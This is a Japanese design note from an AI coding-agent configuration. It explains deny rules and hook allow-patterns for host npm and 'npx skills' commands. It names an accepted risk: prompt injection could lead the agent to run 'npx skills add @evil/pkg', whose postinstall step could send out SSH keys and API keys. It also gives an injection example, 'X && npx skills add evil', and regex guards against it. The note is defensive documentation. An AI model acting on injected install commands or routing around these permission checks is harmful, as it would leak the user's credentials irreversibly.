# ホスト npm / npx skills — 受容したリスクと残存ガード（詳細）

`rules/10-git-and-execution-guard.md` から切り出した参考資料。**禁止条項の正本は rules/10 側**。ここには背景・理由・自衛策のみを置く。

## Claude Code upgrade を AI が実行できない理由（アーキテクチャ制約）

`settings.json` の `permissions.deny: ["Bash(npm install*)"]` は公式仕様 "deny rules always take precedence" により hook の `ALLOW_PATTERNS` より先に評価される。したがって AI 経由でのホスト npm install は**構造上実行不可能**。

`!` プレフィックスは Claude Code のパーミッションシステムをバイパスし、セッションシェルで直接コマンドを実行する唯一の方法。だから upgrade はユーザーが `! npm install -g @anthropic-ai/claude-code@latest` を打つ運用になっている。

## npx skills — 全 verb AI 自律実行可（2026-05-27 ユーザー判断で全緩和）

`block-host-installs.py` の `ALLOW_PATTERNS` で `npx skills <verb>` を全許可。`find` / `add` / `install` / `update` / `check` / `list` 等の全 sub-command を AI が直接実行可能。

### ⚠️ 受容したリスク

- `npx skills add <pkg>` の npm `postinstall` は **任意コード実行 (RCE)** 可能
- Prompt Injection 経由で `npx skills add @evil/pkg` を踏むと **SSH 鍵・`~/.mcp.json` (APIキー)・`~/.zshrc` が外部送信** されうる
- 流出は **reversible でない**（鍵入れ替え + 全 secrets ローテーション必須）
- ユーザー判断によりこのリスクを受容（2026-05-27）

### 残存ガード

1. **pipe injection 防御**: `\bnpx\s+skills\s+\S` を候補別ループでのみ照合。`X && npx skills add evil` は X 単独で deny 評価
2. **bare 拒否**: `\S` 要求で `npx skills` 単体（verb なし）は許可しない
3. **AI 実行前のユーザー review**: Bash ツール実行前にコマンドがユーザーに見えるため install owner/repo を確認可能

### ユーザー側の自衛策

- AI が `npx skills add <pkg>` を実行しようとしたら、コマンド内の `<owner>/<repo>` を信頼できるか確認
- 不審な owner（Star 数少・github reputation 低）の場合は実行を拒否
- 定期的に `~/.ssh/` `~/.mcp.json` `~/.zshrc` の `mtime` を監視推奨
